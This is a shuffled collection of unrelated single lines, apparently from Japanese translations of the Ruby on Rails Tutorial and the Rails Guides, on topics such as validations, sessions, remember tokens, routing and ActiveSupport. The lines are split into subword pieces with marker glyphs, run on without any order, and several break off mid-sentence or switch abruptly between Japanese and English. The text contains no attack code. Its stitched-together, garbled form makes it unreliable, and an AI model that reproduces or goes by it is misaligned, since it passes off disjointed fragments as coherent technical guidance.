▁` redirect _ to ` を実行し た 後 、 コードは そこで 実行 を 終 了 し 、 ブラウザから の 次の リクエストを 待 ち ます ▁( 通常の ス タ ン バ イ 状態 ) 。
▁ } ╼╼% ▁subsection ▁login _ with _ remember ing ▁( end )╼╼ \ subsection { ユーザーを 忘れ る } ▁% ▁( fold )╼\ label { sec : for getting _ users }╼╼
▁d ▖ prev _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁01 ▁May ▁2010
▁#< User ▁id : ▁2, ▁name : ▁" A ▁N other ", ▁email : ▁" another @ example ▖ org ", ▁created _ at :
▁ 読者 の P a ul ▁ Fi or a v an t i が この 用 語 を 提 案 してくれ ました ▟ あり が と う ご ざ います 。
▁しかし この 画面 だけで はほとんど 実 用 性 が ないので 、` Book ` モデル を作成し 、` Book sController ` に index アクション を追加 してみましょう 。
▁* ▁` app ` ディレクトリ ツリー
▁ これによって 以下の SQL が生成されます 。
▁\ ref { sec : rails _ routes } では この デフォルト ページ を削除し 、 カスタマイズ した ホームページ に置き換える 予定です 。
▁ 利用 可能な ヘルパー を 1 つ ずつ 見 ていきましょう 。
▁ このように して 名前付きルート で クエリ パラメータ を定義する と 、 Rails が 特殊な 文字 を自動的に エスケープ してくれます 。
▁ フィード の HTML をテストする
▁d ▁= ▁ DateTime ▖ current
▁ 表示 結果を 今 すぐ 確認し たい のであれば 、 図 \ ref { fig : layout _ no _ logo _ or _ custom _ css } で 確 認 できます
▁\ ref { sec : professional _ grade _ deployment } では 、 最初の 問題 を 防止 するために \ href { https :// en ▖ w ikipedia ▖ org / wiki / Transport _ L a y er _ Security } { S ec ure ▁So cket s ▁L a y er } ▁( SSL ) ▁ を サイト 全体 に 適用 して 、 ネットワーク データを 暗号化 で 保 護 し 、 パ ケ ッ ト ス ニ ッ フ ァ から 読み 取 ら れ ない ようにしています 。
▁ Factory ▁Girl を使用した テストを実行 してみる と すぐに 気 が 付 く と思います が 、 正 直 言 って \ emph { 遅 い } です 。
▁\ ref { sec : a _ working _ log _ in _ method } で 解説 した ように 、\ k ode { session } メソッドで 保存 した 情報 は自動的に 安全 が 保 た れ ますが 、\ k ode { cookies } メソッド に保存 する 情報 は 残念ながら その ように は な って いません 。
▁if ▁@ user ▖ save
▁class ▁ LineItem ▁< ▁ActiveRecord :: Base
▁1 つの 条件 を 複数の バリデーション で 共 用 できる と 便利な ことがあります ▟ これは ` with _ options ` を使用することで 簡単に 実現 できます 。
▁validates ▁: order , ▁presence : ▁true
▁User モデル のバリデーション と エラーメッセージ の パーシャル が 既に あるので ▁( リスト \ ref { code : user _ edit _ view }) 、 無効な 情報を 送信する と 役 立 つ エラーメッセージ が表示される ようになっています ▁( 図 \ ref { fig : b ug g y _ edit _ with _ invalid _ information }) 。
▁<%= ▁link _ to ▁' A d ▁details ', ▁ magazine _ ad _ path (@ magazine , ▁@ ad ) ▁%>
▁ さ し あ た って の実装 計 画 としては 、\ k ode { user ▖ remember } メソッド を作成する ことにします ▟ このメソッドは 、 記憶トークン を ユーザー と 関連付け 、 トークン に対応する 記憶ダイジェスト を データベースに保存 します 。
▁ 逆に 、( 実行 結果を 示 さ ない ) ▁ 通常の コメント では 矢 印 を使用し ないこと 。
▁Object ▖ qualified _ const _ defined ? (" Math :: P I ") ▁# ▁=> ▁true
▁* ▁`: through ` 関連付け と併用する ことはできません 。
▁ 以下のコード について 考えてみましょう ▟ クライアント を 10 人 検索 して 郵 便 番号 を表示します 。
▁### ▁ グループ 化
▁[ データ URI ス キー ム ]( http :// ja ▖ w ikipedia ▖ org / wiki / Data _ URI _ scheme ) ▁( CSS ファイルに データ を直接 埋 め 込 む 手法 ) ▁ を使用したい場合 は 、` asset _ data _ ur i ` を使用できます 。
▁ 開発 の ご く 初期 の 段 階 なら 全 ページを 目 視 で ひとつ ひとつ 確認し て 回 ること も できる かもしれませんが 、 そんな 方法 では じ き に 手 に 負 え なくなります ▟ この アプリ では 必要な テストスイート が 整 備 されているので 、 今 度 も ▁\ passing ▁になることを確認 するだけで O K です 。
▁たとえば 「 Gemfile 」 という ファイル名 を検索する と 、\ k ode { Gemfile } と \ k ode { Gemfile ▖ lock } を含め 、 候 補 が 6 つ も 表示 されてしまいます 。
▁ 本チュートリアル で 使用している 取り 決 め や 表 記 は 、 説明 不要な もの が ほとんど です 。
▁def ▁empty ?
▁\ ref { sec : login _ with _ remember ing } では 、 それ まで の 節 で実装した 永続的セッション が動作する かどうかを 手動で 確認し ていました ▟ しかし 実は 、\ k ode { current \_ user } 内の ある 分 岐 部分 については 、 これまで まったく テスト が行われていない のです 。
▁ これが 特に 便利な のは 、 実装 に依存する のが 2 番目の 要素 である ステップ ファイル だけ である 点 です ▟ そのため 、 たとえば エラーメッセージ を表示する ための CSS を変更 しても 、 フィーチャー ファイルは 変更 不要 です 。
▁config ▖ assets ▖ compile ▁= ▁true
▁ 現在 どの ディレクトリ で 作業 している か が わ から なく な った 場合は 、\ ref { sec : the _ hello _ application } ▁( 図 \ ref { fig : directory _ structure _ rails }) を再度 参 照 して 、 Rails ▁ の ディレクトリ 構造 を 確認してください 。
▁< body >
▁* ▁` readonly `
▁* ▁ モデル および モデル 内の データ を表現する
▁ ログイン 中の ユーザー用の レイアウト のリンク を変更する
▁cookie には 文字列 や 数字 などの 単純な データ だけ を保存する ことをお勧めします 。
▁* ▁[ キャッシュ の 最適化 ]( http :// code ▖ google ▖ com / speed / page - speed / docs / caching ▖ html )
▁ これまで は コンソール 上で クラス を定義し ましたが 、 このような 面倒な 作業 は もう 行 いた く ありません ▟ これ から は 、 アプリケーションのルート ディレクトリに \ k ode { example _ user ▖ rb } ファイルを作成し 、 そこに {1} {2} リスト 4 ▖ 1 3 {/2}{/1} のように 書く ことにします 。
▁ Asset ▁Pipeline で LESS を使う こともできます ▟ 詳細は \ href { http :// rubygems ▖ org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } を参照してください 。
▁ アプリケーションが これらの 機能 に依存し ている 場合は 、[ ` active support - json _ en code r ` ]( https :// github ▖ com / rails / active support - json _ en code r ) ▁gem を Gemfile に追加する ことで 以前の 状態 に 戻 す ことができます 。
▁ 一 方 、 例えば 、 以下のコード を実行すると
▁# ▁< tt > collection ▖ exists ? </ tt > ▖ ▁If ▁the ▁collection ▁has ▁not ▁already ▁been ▁( < tt > collection ▖ exists ? </ tt > と 同 値 ▟ コレクション が 読み 込 まれ て お らず 、 )
▁class ▁ Part ▁< ▁ActiveRecord :: Base
▁ユーザーの 削除 は 管理者 ユーザー のみ が 行えるように 制限 されて いた の に対し 、 今回の 場合は カレント ユーザーが 作成した マイクロポスト に対して のみ 削除リンク が動作する ようにします 。
▁true ▖ dup ▁# ▁=> ▁ Type Error : ▁can ' t ▁ dup ▁T r ue Class
▁ ドキュメント 関連 で 貢献 したい場合は 、[ API ▁ ドキュメント 作成 の ガイドライン ]( api _ document ation _ guidelines ▖ html ) ▁ と [ Rails ▁ ガイド の ガイドライン ]( ruby _ on _ rails _ guides _ guidelines ▖ html ) ▁ を よく 読んで から に してください 。
▁特定の属性にアクセスするための 、 ファイル アップロード 用 input タグを返します 。
▁ 実際の 理由は 、 Rails チーム は この種の 内部 メソッドの 動作を 必要に応じて リリース ごとに 変更 できるように したい からです 。
▁#### # ▁` limit `
▁### ▁` errors ▖ add `
▁( もし 注 釈 を 最新の 状態 に 保 ち たい のであれば 、 データモデル が 変わる たびに \ k ode { annotate } を実行し なければならない ことに注意してください ) 。
▁( この 属性 を実装する のは \ ref { sec : administrative _ users } になって からです ) 。
▁Ajax は クライアント側 だけで なく 、 ある程度 サーバー側で の サポート も 必要です 。
▁たとえば 、`: before _ save ` コールバック を使用して 、 オブジェクトが保存される 直前に 何か を実行する ことができます 。
▁ 具体的には 、\ emph { spec } ▁ と呼ばれる テスト ファイルを作成し 、 その ファイルに 、\ emph { 本書 で 指示 された 通り に } テストコード を コピー & ペ ー スト してください 。
▁{0} 第 {1} 5 {/1} 章 {/0} から {2} 第 {1} 10 {/1} 章 {/2} に かけて 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システムを 順に 作成し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁( リスト \ ref { code : log _ in _ password _ reset } と 図 \ ref { fig : forgot _ password _ link } 参 照 )
▁上の 出力 は 、 ユーザー オブジェクトを コンソール 用に 出力 した ものです 。
▁これらの クラス 同士 の関係 を 図 \ ref { fig : demo _ controller _ inheritance } に示します 。
▁この 名前 の 由 来 は ▁“ \ href { http :// en ▖ w ikipedia ▖ org / wiki / Active _ record _ p at ter n } { active ▁record ▁pattern } ” ▁ です ▟ M ar t in ▁F o w ler 著 「\ emph { エ ン ター プ ラ イ ズ ▁ アプリケーション アーキテクチャ パターン ▁ }」 で 特定 および 命 名 されました 。
▁そこで 、 この 先 に進む前に 先 の 2 つの アプリ を 思い 切 って 削除 して おくとよいでしょう ▟ アプリ を削除する には 、\ k ode { workspace } ディレクトリ に移動し て \ k ode { rm ▁- r f ▁ hello \_ app / ▁toy \_ app / } コマンドを実行 します ( 表 \ ref { table : uni x _ commands }) 。
▁ 原 因 は 、 テストで 使用 して いた テスト ヘルパーメソッド の名前 が 、 う かつ にも Sessions ヘルパーメソッド 名 と同じ だった ことです ▟ そのため 、 アプリケーションが 壊 れ て いて も テストが パス し てしまい ました 。
▁これは 、 Rails の 知識 が 無 く ても Home ページ や Help ページを 修正 できる ことを 意味 しています ▟ 以下の リスト \ ref { code : custom _ home _ page } や リスト \ ref { code : custom _ help _ page } が その 一 例 です 。
▁ セッション の \ k ode { destroy } アクション の定義 と テストが 完成 した ので 、 ついに 3 大 機能 である 「 ユーザー登録 / ログイン / ログアウト 」 がすべて 完成 しました ▟ テストスイート は ▁\ passing ▁ になるはずです 。
▁ これはリスト \ ref { code : rails _ routes } で使用されていました 。
▁format ▖ html ▁ { ▁redirect _ to (@ user , ▁notice : ▁' ユーザーが 正常に 作成 されました ▟ ')
▁この コードを じ ゅ ん を お っ t 組み 立 て てみると 、 動作 が よく わかります 。
▁It em ▖ transaction ▁do
▁( リスト \ ref { code : sidebar _ micropost _ count } を参考に してみてください )
▁T ur ing ス ク ー ル では 、 生 徒 が 卒 業 後に 職 を見つけ ること を 保 証 して いて 、 見 つ から なければ 授 業 料 を 返 還 しています 。
▁| ▁| ▁40 4 ▁| ▁: not _ f ound ▁|
▁ActiveRecord :: Connection Time out Error ▁- ▁could ▁not ▁obtain ▁a ▁database ▁connection ▁within ▁5 ▁second s ▖
▁NOTE : ▁上のように コマンド オプションで マイグレーション 名 と カラム の 仕 様 を指定する ことで 、 特定の テーブル に追加し よう と している カラム が Rails によって自動的に 認 識 され 、 そのため の マイグレーション が 作成されます 。
▁デフォルトは ` nil ` であり 、 この場合 最初に インデント されている 行 の インデント 文字 を参照 して そこ から インデント 文字 を推測し ます ▟ インデント が まったく ない場合は スペース 1 つ を使用します 。
▁Action ▁View の テンプレート は 、 HTML タグ の 合 間 に ERB ▁( Embedded ▁Ruby ) ▁ を含む 形式で 書かれ ます 。
▁Client ▖ find _ by ▁first _ name : ▁' Lifo '
▁また 、 HTML ヘッダー は 論 理 的な 単 位 を 形 成 する ため 、 一 箇所 に まとめ る 必要もあります 。
▁ フォロー していない ユーザーの 画面
▁> > ▁ FooBar ▖ new ▖ to _ json ▁# ▁=> ▁" { \ " foo \ " : \ " bar \ "} "
▁ ビュー が 整 って きました ▟ いよいよ ▁[ フォローする ] ▁[ フォロー解除 する ] ▁ ボタン を 動作 させ ましょう 。
▁# ▁=> ▁< input ▁id =" g end er _ ma le " ▁name =" g end er " ▁type =" radio " ▁value =" ma le " ▁/>
▁ デフォルトの スト ア 名 は `: cookie _ store ` です ▟ こ の他に `: active _ record _ store `、`: me m _ cache _ store ` 、 または カスタム クラス の名前 を指定できます 。
▁\ k ode { update _ columns } を使用する テンプレート
▁Gemfile に 新しく 追加 した gem を 実際に インストール するには 、\ k ode { bundle ▁update } と \ k ode { bundle ▁install } を実行します 。
▁ ページネーション された ユーザー一覧ページ
▁$ ▁bundle ▁exec ▁ guard ▁in it ╼ Writ ing ▁new ▁ Guardfile ▁to ▁ / home / ubuntu / workspace / sample _ app / Guardfile ╼ 00 : 51 : 32 ▁- ▁INFO ▁- ▁ minitest ▁ guard ▁added ▁to ▁ Guardfile , ▁feel ▁free ▁to ▁edit ▁it
▁ 安 心 して \ k ode { t } オブジェクト に 仕 事 を 任 せ れば よい のです 。
▁Rails のデフォルトの ` belongs _ to ` 関連付け は 、 ほとんどの場合 カスタマイズ 不要 ですが 、 時に は 関連付けの 動作を カスタマイズしたくなること も ある と思います 。
▁Rails ▁4 は Sprockets のデフォルト 設定 値を test 環境 用の ` test ▖ rb ` に設定し なくなりました ▟ 従って 、` test ▖ rb ` に Sprockets の設定 を行なう 必要があります 。
▁リスト \ ref { code : initial _ working _ feed } の 条件 では 、 集合 に 内 包 されている かどうか だけ しか チェック されていない ため 、 この 部分を もっと 効率 的な コード に できる はずです ▟ そして 、 SQL は 本 来 このような 集合 の 操作 に 最適化 されています 。
▁以下の いくつかの 例 を参照 して 理解 を 深 め てください 。
▁ ネストした ハッシュ に パラメータ を含め たい場合は 、 この ファイルに 以下の コンテンツ を含め て 追加します 。
▁` cache ` メソッドは 、( アクション 全体 や ページ 全体 ではなく ) ▁ ビューの 断 片 を キャッシュ する メソッドです 。
▁ これはリスト \ ref { code : error _ messages _ test } で使用されていました 。
▁# ▁Read ▁more : ▁ https :// github ▖ com / rails / turbolinks
▁### ▁ 必要な ら 何 度 でも ト ラ イ する
▁\ ref { sec : pagination } では ページネーション を使い ましたが 、 今回 も 同じ 方法で この問題 を 解決 します 。
▁また 、 Active ▁Record を理解する 上で 、 「\ emph { 有効 性 ▁( V al id ity ) }」 という 概念 も 重要です 。
▁ CarrierWave を通して S 3 を使う ように 修正 する
▁次に 、 プロジェクト の ファイルを リポジトリ に追加します 。
▁( 今後 非推奨 になる 計 画 あり )
▁上のコード には 途中 に 改行 が含まれている にもかかわらず です 。
▁ とは い え 、 ユーザーに 手 元 で 画像 サイズ を変更 させる のは 不 便 です ▟ なので 、 画像 を 表示 させる 前に サイズ を変更する ▁( リ サイズ する ) ▁ ように してみましょう
▁ サンプルアプリケーションの Home ページのモックアップ
▁ 失敗した テストの エラーメッセージ を もっと 詳 しく 見 ていきましょう
▁ 非 破壊的な メソッドでは 無効な 場合に 例外を発生 しません ▟ ` save ` と ` update ` は 無効な 場合に ` false ` を返し 、` create ` は 無効な 場合に 単 に その オブジェクトを返します 。
▁`: foreign _ key ` オプションを使用すると 外部キー の名前 を直接 指定 することができます 。
▁` L o ad Error ` の拡張
▁ 導 入 後 、 Web サーバ を 再起動 させる と 、 アプリケーションに 反 映 させる ことができます ▁(\ ref { fig : sample _ app _ only _ bootstrap } で紹介した ように 、 Ctrl - C を 押 して Web サーバ を 停 止 させた 後 、 ▁\ k ode { rails ▁server } コマンドを 打 って Web サーバ を 起動 してください )▟ うまく い け ば 図 \ ref { fig : sample _ app _ only _ bootstrap } のような 結果 に
▁" 私 は # { super } "
▁\ k ode { self } キーワード を与える と 、 この 代入 によって ユーザーの \ k ode { remember _ token } 属性 が 期待どおり に設定されます
▁リスト \ ref { code : rails _ routes } の Users リソース が提供する RESTful な ルート
▁<%= ▁fields _ for ▁@ person ▖ permission ▁do ▁| permission _ field s | ▁%>
▁この 変更 により リスト \ ref { code : name _ presence _ test } のテスト は {2}{3}{/3}{3}{4} 成功 {/4}{/3}{3}{/3} {/2} している はずです 。
▁ 適用 される プ リ プロセス の種類 は 、 アセット ファイルの 拡張子 によって 決 まり ます 。
▁# ▁options ▁= ▁ args ▖ extract _ options !
▁ 著 作 権 と ラ イ セ ン ス
▁ ルーティング プロキシ メソッド呼び出し を省略した このような アプリケーション ルーティングヘルパー メソッドを 、 エンジン 内で レンダリング される テンプレート から 呼 び 出 そう と すると 、 未 定義 メソッド呼び出し エラー が発生する ことがあります 。
▁この リスト では 、 { p 0} の 「 パーシャル 」 の ところで も 使 った {2} render {/2} メソッド を再度 使い ま わ しています ▟ {2} render {2} {/2} {/2} は コントローラのアクション の中で も 正常に動作し ます 。
▁end _ of _ day
▁もし す で に master ブランチ に いる場合 は 、1 行目 の コマンドを実行 する必要はありません ) 。
▁# ▁ SELECT ▁clients ▖ id , ▁clients ▖ name ▁FROM ▁clients
▁ ルート URL にアクセスすると Home ページ が表示される
▁{0}{1} リスト 4 ▖ 12 {/1}{/0} では 、 単語 の 文字 を 逆 順に した もの が 元の 単語 と同じ である かどうか の チェック を 、\ k ode { Word } クラス の中から 自分自身 が 持つ 単語 にアクセス することで 行 な って いることにご注目ください 。
▁ 表示 結果 の中で 重要なのは 最初の 列 の 数値 です ▟ これは \ emph { プロセス id } 、 略 して p id と呼ばれる ものです 。
▁format ▖ html ▁ { ▁render ▁layout : ▁' my _ layout ' ▁ }
▁ そのような メソッド には ` downcase `、` g s ub `、` strip `、` ch o mp `、` underscore ` など があります 。
▁ 部分 テンプレート または パーシャル は 、 出力 を 扱 い や す く 分割 するための 仕 組み です 。
▁ トークン は ハッシュ 値 に変換 してから データベースに保存 する 。
▁今回の場合 は 、 オブジェクトが保存される 時点 で 処理を 実行 したい ので 、\ k ode { before \_ save } という コールバック を使います ▟ これ を使って 、 ユーザー をデータベースに保存する 前に email 属性を 強制的に 小文字 に変換 します
▁Load ing ▁development ▁environment ▁in ▁ sandbox
▁次の {0} 第 {1} 9 {/1} 章 {/0} で使用する セキュリティ モデル では 、 ログイン した ユーザー だけ が 自分の index ページに 移動 できるように したり 、 正 当 な ユーザー だけ が 自分の ページの プロフィール 情報を 編集 できるように したり 、 管理者 だけ が 他の ユーザーを データベースから 削除 できるように したり します 。
▁これらの _ path ヘルパー には 、 それぞれ に対応する ` _ url ` ヘルパー ▁( ` photos _ url ` など ) ▁ があります ▟ _ url ヘルパーは 、 _ path の 前に 現在の ホスト 名 、 ポート 番号 、 パス の プレフィックス が追加され ている 点 が異なります 。
▁ あのときは 、\ text tt { palindrome ?} メソッドを \ text tt { String } クラス に追加し ました ▁( つ い で に \ text tt {" de if i ed "} も 回 文 になっている ことを 発 見 しました )▟ また 、 Rails が 実は \ text tt { blank ?} メソッドを \ text tt { Object } クラス に追加し ていること も 判 明 しました ▁( これにより 、\ text tt {" "▖ blank ?} 、\ text tt {" ▁" ▖ blank ?} 、\ text tt { nil ▖ blank ?} は いずれも \ text tt { true } になります ) 。
▁ 必要であれば 画像ファイル を サブディレクトリ に置い て 整 理 することもできます ▟ この 画像 にアクセス するには 、 ディレクトリ 名 を含め て 以下のように タグ で 指定します 。
▁ サイドバー で 表示する ユーザー情報 の パーシャル
▁=> ▁10 2 4
▁{0} 図 3 ▖5{/0}{1} 作成した About ページ ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static _ pages / about })▟ \ href { http :// railstutorial ▖ org / images / figures / about _ us _ 2 nd _ edition - full ▖ png }{( 拡大 ) }{/1}
▁# ▁=> ▁" O h ▁ dear !
▁上のコードでは 、\ k ode { Micropost ▖ find } ではなく \ k ode { Micropost ▖ where } を使用しています ▟ where メソッドは 、 レコード がない場合 に 空の オブジェクト を返す ので 多少 テストが 書き や す くなる ためです ▁( find は レコード がない場合 に 例外を発生 します )▟ (
▁ ユーザーのマイクロポスト の配列 を返す 。
▁Rails には さまざまな 認証システム があります が 、 その中で 人 気 が 高い 認証システム は [ Devise ]( https :// github ▖ com / plat a format ec / devise ) と [ A u th log ic ]( https :// github ▖ com / bin ary log ic / authlogic ) ▁gem の 2 つ です 。
▁リスト \ ref { code : first _ create _ action } の コメント と 、 上の 再 録 コメント でも 重 ね て 指 摘 している ように 、 この 実装 は 最 終 形 ではありません 。
▁ キ ャ プ ション として 指定された テキスト を使用して 送信 ボタン を作成します 。
▁User ▖ where ( state : ▁' inactive ')
▁id = \ k ode {1} のマイクロポスト を更新する アクション
▁従って 、 このような オブジェクトは ` dup ` メソッド や ` clone ` メソッドで 複 製 する ことはできません 。
▁ コントローラ を 名前空間 によって グループ 化 することもできます 。
▁@ order ▖ customer ▁= ▁@ customer
▁ 出力結果 は以下のようになります 。
▁c 2▖ save ▁# ▁ActiveRecord :: StaleObjectError を 発生
▁\ ref { sec : account _ activation _ mailer } では 、 実際に この 決定 が 重要 になって きます 。
▁#### ▁ すべての Active ▁Support を 読み込む
▁Home 、 Help 、 About 、 Contact の各 ページ へのリンク が正しく 動く か 確かめ る
▁ 実際には 「 Ctrl キーを 押 しながら c キーを 押 す 」 ことを意味します ▟ このとき 、 大文字 の C に するために S h if t キー も一緒に 押 す 必要はありません ▟ 表 記 上の 習慣 により 大文字 で 「 Ctrl + C 」 と 書かれてい る に過ぎません 。
▁Git を使用して プロジェクト を バージョン管理 下 に 置く ことが できたので 、 今度は \ href { http :// github ▖ com } { GitHub } に ソースコード を アップロード してみましょう ▟ GitHub は 、 Git リポジトリ の 置き場所 を提供 したり ▁( ホスティング ) 、 リポジトリを 開発者 同士 で 共有 する サービス を提供 したり する Web サービス として 有 名 です 。
▁### ▁development 環境 を 構 築 する
▁#### # ▁`: content _ type ` オプション
▁リスト \ ref { code : users _ migration } で生成された User の データモデル
▁duplicate ▁= ▁array ▖ deep _ dup
▁\ k ode { string } は ハッシュ化 する 文字列 、\ k ode { cost } は \ emph { コ スト パラメータ } と呼ばれる 値 です ▟ コ スト パラメータ では 、 ハッシュ を算出 するための 計算 コ スト を指定します 。
▁d ▁= ▁Date ▖ new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁ 以後 本チュートリアル の演習 を 解 く 際に は 、 以下のように 演習 用 トピックブランチ を 別 途 作成 して そこで 行う ことをおすすめします 。
▁### ▁ リクエスト 内容 に応じて 制限 を加える
▁ po ol : ▁5
▁ 同様に 、 分 が ゼロ の場合 、 秒 も 値を 与 えられ ない限り ゼロ になります 。
▁NOTE : ▁ 返される のは ` option ` だけです ▟ 従って 、 出力結果 の 外 側 を 適切な HTML ▁` select ` タグ で 囲 む 必要があります 。
▁### ▁ アセット を設定する
▁ Apache と NGINX では この オプション が サポート されており 、 以下のように ` config / environments / production ▖ rb ` で 有効 に することができます 。
▁| ▁| ▁4 1 3 ▁| ▁: request _ entity _ to o _ large ▁|
▁第 \ ref { cha : a _ toy _ app } 章 でも 指 摘 した とおり 、 主な 理由は 、 デフォルトの Rails ページ は Heroku で 破 損 してしまう ことが 多く 、 そのまま だと デプロイ が成功した のか 失敗した のか が わかりにくい ためです 。
▁ 本チュートリアル で リポジトリ を採用する うえで 重要な 両者 の違い は 、 GitHub は 「 リポジトリを 一 般 公開 する 場合は 無料 、 公開 しない 場合は 有 料 」 な の に対し 、 Bitbucket は 「 共 同 作業 者 が 一 定数 以下 なら リポジトリを 公開 し なくても 無料 、 共 同 作業 者 が 一 定数 を 超 え ると 有 料 」 である 点 です ▟ なお 、 どちらも 容 量 制限 はありません ▟ The ▁important ▁difference s ▁( from ▁the ▁per spec tive ▁of ▁this ▁tutorial ) ▁are ▁that ▁GitHub ▁offer s ▁un limited ▁free ▁repositories ▁( with ▁collaborat ion ) ▁for ▁open - source ▁repositories ▁while ▁charg ing ▁for ▁ private ▁ repo s , ▁whereas ▁Bitbucket ▁allows ▁un limited ▁free ▁ private ▁ repo s ▁while ▁charg ing ▁for ▁more ▁than ▁a ▁certain ▁number ▁of ▁collaborat or s ▖
▁ 名前付きルート
▁ユーザーの 一覧 ページ を実装する ために 、 まずは セキュリティ モデル について 考えてみましょう 。
▁たとえば 、` User ` という モデルに ` name ` と ` occupation ` という 属性 があると すると 、` create ` メソッド を実行すると 新しい レコードが 1 つ 作成 され 、 データベースに保存 されます 。
▁require ▁A P P _ PATH
▁`: constraints ` オプションを使用すると 、 動的 セグメント の URL フォーマット を 特定の 形式 に 制限 することができます 。
▁ 現在 どの ディレクトリ で 作業 している か が わ から なく な った 場合は 、\ ref { sec : the _ hello _ application } ▁( {2}{1} 図 ▁1▖ 4 {/1}{/2} ) を再度 参 照 して 、 Rails ▁ の ディレクトリ 構造 を 確認してください 。
▁上の 説明 に基いて 、 ダイジェスト トークン を The ▁above ▁discussion ▁suggest s ▁ putting ▁the ▁digest – token ▁compar is on ▁into ▁an ▁\ k ode { authenticated ?}
▁m attr _ accessor ▁: log _ ac t i v ity
▁Rails は これらの \ k ode { name } の値 を使用して 、 初期化 ハッシュ を ▁(\ k ode { params } 変数 経由で ) ▁ 構成 します ▟ この ハッシュ は 、 ユーザーが 入力 した 値 に基づいて ユーザー を作成するとき ▁(\ ref { sec : signup _ failure }) ▁ に 使用されます 。
▁上のように 、 name と email 属性 が 期待どおり 設定 されている ことがわかります 。
▁=> ▁" \ # { foo } ▁bar "
▁` first !` メソッド の動作 は 、 マッチする レコードが 見つからない 場合に ` ActiveRecord :: RecordNotFound ` 例外 が発生する 点 を除いて 、` first ` メソッドと まったく 同じです 。
▁もちろん 、 ユーザー表示ページ の 最終的な 状態 は これ とは 大きく 異なります し 、 この メールアドレスが この まま 一般に 公開 される ような ことも ありません 。
▁\ href { http :// s ivers ▖ org /}{ デ レ ッ ク シ バー ズ ▁( D er e k ▁S ivers )} ▁(\ href { http :// s ivers ▖ org /}{ s ivers ▖ org })
▁` class _ attribute ` メソッドは 、1 つ 以上の 継 承 可能な クラスの 属性を 宣言 します ▟ その クラス 属性 は 、 その 下 の どの 階層 でも 上書き 可能です 。
▁ デフォルト値 は ` false ` です 。
▁An y ▁modification s ▁you ▁make ▁will ▁be ▁roll ed ▁back ▁on ▁ ex it
▁* ▁ エンジンの 生成 方法
▁ 新しい Rails アプリケーションを ゼロ から 作成した のは これで 3 度 目 ▟ 今回 も 必要な gem のインストール 、 リモート リポジトリ への プッシュ 、 production 環境 まで 行った 。
▁* ▁` i 18 n ▖ callback s `: ▁development 環境 の場合 、` to _ prepare ` コールバック を設定します ▟ この コールバック は 、 最後に リクエスト が発生し た 後に ロケール が変更され ると ` I 18 n ▖ reload !` を呼び出します 。
▁User と その Micropost は ▁\ k ode { has \_ many } ▁( 1 対 多 ) ▁ の関係 性 がある
▁ サンプルアプリケーションの \ k ode { config } ディレクトリ の内容
▁< http :// localhost :3000/ articles / new > を ブラウザで 開 いて 試 してみましょう 。
▁: name
▁`: as ` オプションを使用することで 、 どんな ルーティング にも 名前 を指定できます 。
▁( これ については 後で 詳 しく 説明します ) 。
▁Rails ▁3▖1 から Rails ▁3▖2 へのアップグレード
▁on ▁ deploying ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : beginning _ co nclusion }╼╼
▁Ruby ▁on ▁Rails ▁ チュートリアル
▁(\ k ode { v im } という コマンド 名 は 、 使用している 「 フ レ ー バー 」 によって は \ k ode { gvim } や \ k ode { mv im } など になっている ことがあります ▟)
▁Load ing ▁development ▁environment
▁上の メソッドの ` collection ` の 部分 は プレースホルダ であり 、 実際には ` has _ many ` への 1 番目の 引数として 渡された シンボル に置き換えられます ▟ また 、` collection _ singular ` の 部分 は シンボル の 単数形 に置き換えられます 。
▁ エントリ を 記 入 する 場合は 80 文字 目 で 折 り 返します )
▁( なお 、 これは \ ref { sec : sessions _ controller } で生成した Sessions コントローラと は 無 関係 です のでご注意ください ) 。
▁上 を実行する ことで バージョン を 確 認 できます 。
▁上のコード で 使用している \ k ode { authenticated ?} メソッドは 、 アカウント有効化 の ダイジェスト と 、 渡された トークン が 一致する かどうかをチェックします ▟ ただし 、 このメソッドは 記憶トークン ▁( リスト \ ref { code : authenticated _ p }) ▁ 用 なので 今は 正常に動作し ません 。
▁== ▁Create Users : ▁migrat ed ▁(0▖00 18 s ) ▁= ============== =========
▁ 変更 後 の パス を使用して も 、 ルーティング 先 は 依 然 として ` new ` アクションと ` edit ` アクション のまま です 。
▁* ▁` ar ound _ perform `
▁図 \ ref { fig : riding _ rails _ environment } のように 詳細な 情報 が表示されます ▁( バージョン番号 など は 異なる こともあります ) 。
▁ 同 一 生成 元 ポ リ シ ー の バ イ パス と ク ロ ス オ リ ジ ン ( cross - origin ) リクエストを サイト ごとに 許可 します 。
▁a d への URL には magazine も なければなりません 。
▁identical ▁config / b oo t ▖ rb
▁# ▁Last - Mo d if i ed フィールド が存在する 場合は ETag の使用 が 妨 げ られる
▁ リダイレクト 先 は 、 ユーザーが 開 こう として いた ページに して あ げ る のが 親 切 という ものです 。
▁\ chapter { Rails 風 味 の Ruby } ▁% ▁( fold )╼
▁ ╼ ▁This ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial ▖
▁[ Y U I ▁CSS ▁ compressor ]( http :// yui ▖ github ▖ io / yui compressor / css ▖ html ) は 最小化 機能 を提供します ▁( 訳 注 : ▁この 項 では 、 圧縮 ▁( compress ) ▁という 語 は 最小化 ▁( mini fy ) ▁ や 難 読 化 ▁( ug li fy ) ▁ と同じ 意味 で使用され ており 、 圧縮 後 の ファイルは z ip のような バ イ ナ リ になり ません ) 。
▁ 無効な オブジェクトに対して ` errors ▖ clear ` メソッドを 呼び出し ても 、 それ だけで オブジェクトが 有効 になる わけではありません のでご注意ください ▟ ` errors ` は 空 になります が 、` valid ?` や オブジェクトを データベースに保存 し よう と する メソッドが 次 回 呼び出され たときに 、 バリデーション が 再 実行されます 。
▁ 実際に 動作する \ k ode { destroy } アクション を追加する
▁\ k ode { index } アクション が 保 護 されている こと をテストする 。
▁ 最初は データベース接続 の プール は 空 で 、 必要に応じて 追加 接続 が作成され 、 接続 プール の 上 限 に 達 する まで 接続 が追加され ます 。
▁ 緑 ▁( Green )
▁S ublime ▁Text を使用し ていれば 、\ text tt { View ▁> ▁R ul er ▁> ▁ 78 } 、 または \ text tt { View ▁> ▁R ul er ▁> ▁ 80 } で 設定 できます 。
